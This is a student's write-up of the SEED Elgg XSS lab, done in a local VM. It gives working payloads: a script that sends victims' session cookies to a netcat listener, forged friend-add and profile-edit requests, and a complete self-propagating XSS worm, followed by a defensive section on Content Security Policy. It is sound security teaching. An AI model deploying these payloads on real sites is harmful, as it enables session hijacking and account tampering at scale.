---
title: Laboration 4 - XSS
---

[Lab description](https://seedsecuritylabs.org/Labs_16.04/PDF/Web_XSS_Elgg_new.pdf)

## Environment & tools
The provided SEED lab environment was used, which is a preconfigured virtual machine image running a 32-bit version of Ubuntu 16.04. It is being run in VirtualBox on a 64-bit Linux host.

The vulnerable web application that will be used to demonstrate XSS attacks is a locally hosted instance of the Elgg webapp, which has been modified to remove any sanitisation countermeasures that it has in place to defend against XSS attacks.

## Task 1: Posting a Malicious Message to Display an Alert Window
The first task is simply to poke at some text fields in a user's edit profile page in order to see if they are vulnerable to XSS. The payload being used is simple, just a `<script>` tag which contains some JS code to display an alert window:

```html
<script>alert('XSS');</script>
```

Initially I tried putting it in the longer "About me" field, but thought it was actually sanitised at first as just trying to paste the code in there will lead it to be sanitised and displayed on the profile page. However this is just done by the WYSIWYG editor on the client-side, and switching to the raw HTML mode by pressing the "Edit HTML" link allows you to paste raw HTML code, leading to arbitrary JavaScript being able to be executed. We have found an XSS vulnerability.

{% include image.html url="/software-security/dialog.webp" %}

## Task 2: Posting a Malicious Message to Display Cookies
Now that we have found an XSS vulnerability, we can change the code being used to something a bit more interesting. `document.cookie` is a string that contains the current cookies on the particular page, and we can put that in the alert message as such:

```html
<script>alert(document.cookie);</script>
```

Saving the changes, the alert box will now show the Elgg token cookie used to keep track of a user's session:

{% include image.html url="/software-security/dialog2.webp" %}

## Task 3: Stealing Cookies from the Victim's Machine
We can retrieve our own token cookie, but we already know that if we checked the cookie storage in developer tools. How about stealing others' cookies?

Let's set up a TCP server listening on port 5555 inside of the VM using netcat, which will print out all information of requests that are done to it.

```bash
nc -l 5555 -v
```

Then change the payload inside the "About me" field to write an `<img>` tag which will try to request an image at the given server, putting the contents of the cookie string as a parameter:

```html
<script>document.write('<img src="http://127.0.0.1:5555?c='
+escape(document.cookie)+'">');
</script>
```

The image tag will show up with a broken image icon since there isn't actually any HTTP server that will serve any file there. But the request does show up in the terminal output of the terminal window running our netcat server, and the cookie data is shown as part of the HTTP GET line.

```
Connection from 127.0.0.1:55986
GET /?c=Elgg=i9h507k7spc455e0lhfqvve5p1 HTTP/1.1
Host: 127.0.0.1:5555
[...]
```

It's hosted on localhost on the same machine for demonstration, but in a more real scenario it would be the URL to a publicly accessible server that it gets sent to.

So assuming Elgg does not have any additional security measures to restrict session tokens to a specific IP address, one could then edit one's "Elgg" session cookie to someone else's in Developer Tools > Storage > Cookies, in order to hijack someone else's session and gain access to their account.

## Task 4: Becoming the Victim's Friend
In this task the payload will now make anyone who visits the profile of the attacker become their friend. Some code is provided as a skeleton in the task description, but we need to figure out the URL that Elgg uses to add someone as a friend.

In order to inspect this, the developer tools in Firefox was utilised by going onto someone else's profile and adding them as a friend. Then, in the Network tab, the request shows up with the given URL:

```
http://www.xsslabelgg.com/action/friends/add?
friend=45
&__elgg_ts=1745244864
&__elgg_ts=1745244864
&__elgg_token=6mj0NGY34dMBeZbzta1O0Q
&__elgg_token=6mj0NGY34dMBeZbzta1O0Q
```

Why there are two `__elgg_ts` and `__elgg_token` parameters is beyond me, as PHP will likely deduplicate them when providing the data through the `$_GET` superglobal. But it shows that the endpoint to add a friend is `/action/friends/add`, then a parameter for the user's ID and then two parameters for the token and a timestamp for authentication.

While perusing the settings pages shows that Elgg does not expose the internal ID of the logged in account, viewing the source of any given page while logged in (Right click -> View page source) shows a JavaScript snippet at the bottom defining an `elgg` object. Among the things it contains is a `session` object which contains the information for the currently logged in user. Among this is the user's GUID, which in the case of the currently logged in user (Samy) is 47.

With this information at hand, we can fill out the `sendurl` string to complete the payload, and the full code is as such:

```html
<script type="text/javascript">
window.onload = function () {
	var Ajax = null;
	var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token = "&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the HTTP request to add Samy as a friend.
	// FILLED IN:
	var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
	//Create and send Ajax request to add friend
	Ajax=new XMLHttpRequest();
	Ajax.open("GET",sendurl,true);
	Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
	Ajax.send();
}
</script>
```

Putting this code into the "About me" field, clicking the "Edit HTML" option to be able to paste raw HTML into the field, and then saving shows that the resulting JavaScript successfully executes and will make a request to the add friend endpoint.

It seems to almost work too well, as on a second refresh it turns out Samy has now added himself as a friend. Because while the "Add friend" button does not show up on your own profile, internally there is nothing preventing you from sending a request to add yourself as a friend. Oops!

Trying to log into another account, such as Alice, and then going onto Samy's profile shows that Alice has now added Samy as a friend after a second refresh. If Alice tries to remove Samy as a friend, but then refreshes Samy's profile page, then he will be added as a friend yet again.

{% include image.html url="/software-security/friend.webp" %}

## Task 5: Modifying the Victim's Profile
Now that we have managed to write a payload to send a synthetic add friend request, we can do a similar thing to make someone who looks at Samy's profile edit their own profile.

With the developer tools opened, editing and saving a profile shows a request being made to `/action/profile/edit`, a POST request which contains authentication info, the GUID of the user and values for all other fields. For demonstration we'll use `description`, which updates the "About me" field.

With this information at hand, we can fill out the URL and POST content to complete the payload, and the full code is as such:

```html
<script type="text/javascript">
window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var userName=elgg.session.user.name;
	var guid="&guid="+elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
	// FILLED IN:
	var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
	var content = "description=haxxord" + guid + ts + token;
	var samyGuid = 47;
	if (elgg.session.user.guid!=samyGuid) {
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
}
</script>
```

The purpose of the `if (elgg.session.user.guid!=samyGuid) {` may be obvious when looking at what happened in the previous task where after the JavaScript payload was saved, it immediately ran for Samy making it so that Samy ended up adding himself as a friend. In this case this would replace the payload we just put in the profile description, creating a worm that instantly self-destructs. So the check makes sure that it does not run for Samy.

But now when Alice goes onto Samy's profile it will run this new payload, which will send a request to edit Alice's profile to set the description to "haxxord". Looking at the developer tools shows that the request is successful, and going back to Alice's profile shows that the profile description has indeed been changed to "haxxord".

## Task 6: Writing a Self-Propagating XSS Worm
Combining the two previous tasks, we'll write a fully featured self-propagating worm that will spread to other users' profiles, and everyone who sees a compromised profile will add Samy as a friend.

Some refactoring is done to move out the XMLHttpRequest code into a helper function, but the most important part is that it retrieves its own code (the `<script>` tag being identified by `id="worm"`) to put it in the `wormCode` variable, which is URL encoded and set as the user's description.

```html
<script id="worm" type="text/javascript">
function send_req(method, url, content = null) {
	var Ajax = new XMLHttpRequest();
	Ajax.open(method, url, true);
	Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
	Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
	Ajax.send(content);
}
window.onload = function() {
	var userName = elgg.session.user.name;
	var guid = "&guid="+elgg.session.user.guid;
	var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token = "&__elgg_token="+elgg.security.token.__elgg_token;

	// Grab worm code
	var wormCode = encodeURIComponent(
		'<script id="worm" type="text/javascript">'
		+ document.getElementById("worm").innerHTML
		+ '</'+'script>');

	var samyGuid = 47;
	if (elgg.session.user.guid != samyGuid) {
		//Construct the HTTP request to add Samy as a friend.
		send_req("GET", "/action/friends/add?friend=" + samyGuid
			+ ts + token);

		//Create and send Ajax request to modify profile
		send_req("POST", "/action/profile/edit",
			"description=" + wormCode + guid + ts + token);
	}
}</script>
```

After putting this code into Samy's profile, logging in with Alice's account shows that Samy will once again be added as a friend, as well as putting the same worm code into Alice's description. If we now log in as Charlie and look at Alice's profile, Charlie ends up adding Samy as a friend and the worm code is added to Charlie's profile. On a real website with many active users this would lead to an exponential growth of the worm spreading onto others profiles and all adding Samy as a friend, traversing social graphs until effectively everyone becomes Samy's friend.

A self-propagating worm has been created, made possible through an unsanitised text field and no restriction of what JavaScript that gets executed leading to an XSS vulnerability.

## Task 7: Defeating XSS Attacks using CSP
While there are ways to fully sanitise input on the server-side such that HTML (and by extension JavaScript) can't be injected in places where it shouldn't be, such as with `htmlspecialchars`, reality may not be quite as perfect and sometimes you may want to give users limited access to a safe subset of HTML. While you can make sure to have either a whitelist of safe HTML elements, or a blacklist of unsafe HTML elements, and filter on the server-side according to that, there will undoubtedly exist edge-cases through which an XSS vulnerability may appear.

Thankfully browsers nowadays have a security mechanism on the client-side in the form of the Content Security Policy where a website can tell the browser what sources it should execute JavaScript (along with other resources such as CSS and images) from. This way any potential XSS vulnerability that may exist on the server side as a result of lax validation or sanitisation still wouldn't be exploitable as long as the CSP is well-formed.

The task description gives a simple Python HTTP server with an example CSP, as well as a HTML page which tests various forms of loading JavaScript. Accessing this page on the HTTP server through the following domains gives the following results:

- `www.example32.com`:
	1. Inline: Correct Nonce: OK
	2. Inline: Wrong Nonce: Failed
	3. Inline: No Nonce: Failed
	4. From self: OK
	5. From example68.com: OK
	6. From example79.com: Failed
- `www.example68.com`:
	1. Inline: Correct Nonce: OK
	2. Inline: Wrong Nonce: Failed
	3. Inline: No Nonce: Failed
	4. From self: OK
	5. From example68.com: OK
	6. From example79.com: Failed
- `www.example79.com`:
	1. Inline: Correct Nonce: OK
	2. Inline: Wrong Nonce: Failed
	3. Inline: No Nonce: Failed
	4. From self: OK
	5. From example68.com: OK
	6. From example79.com: OK

The inline script with a correct nonce always runs as it's listed in the CSP, as well as a linked source script from the same domain (self). In `www.example79.com` the 6th test succeeds as loading from `example79.com` becomes the same as `self`, which is included in the CSP. The 5th test always succeeds because the domain is part of the CSP.

To make the 2nd and 6th tests pass, you'll need to add the `*.example79.com:8000` as well as `'nonce-2rB3333'` to the CSP. In order to make the 3rd test, inline script without a nonce, run we would need to add `unsafe-inline`. As the name suggests, this is not safe and essentially disables any protection the CSP may create against XSS attacks as if the attacker has a vulnerable text field with enough space for putting inline code, they can still execute just about anything. The `nonce` rules in the CSP also needs to be removed, or it will conflict with the `unsafe-inline` rule.

The resulting CSP that makes all the tests pass is the following:

```python
self.send_header('Content-Security-Policy',
	"default-src 'self';"
	"script-src 'self' 'unsafe-inline'"
		"*.example68.com:8000 *.example79.com:8000;")
```

But it would still be vulnerable to XSS, if we assume the "Click me" button with inline JavaScript included to create an alert box has been injected by an attacker.

A more secure CSP would be to use the `sha256-` rule to make the inline script without a nonce test pass. The SHA256 hash of the inline script, in binary form and then encoded into Base64, would be `UYq4q365X6QrXOmPekJB0IiRrPJSovRYlucQN57IPT8=`. With the nonces included again, the fully secure CSP would be:

```python
self.send_header('Content-Security-Policy',
	"default-src 'self';"
	"script-src 'self'"
		" *.example68.com:8000 *.example79.com:8000"
		" 'nonce-1rA2345' 'nonce-2rB3333'"
		" 'sha256-UYq4q365X6QrXOmPekJB0IiRrPJSovRYlucQN57IPT8=';")
```

With this CSP all the tests pass, and pressing the "Click me" button does not execute any JavaScript to trigger an alert message. Some necessary inline JavaScript is still able to run, while any potential XSS attacks are thwarted.
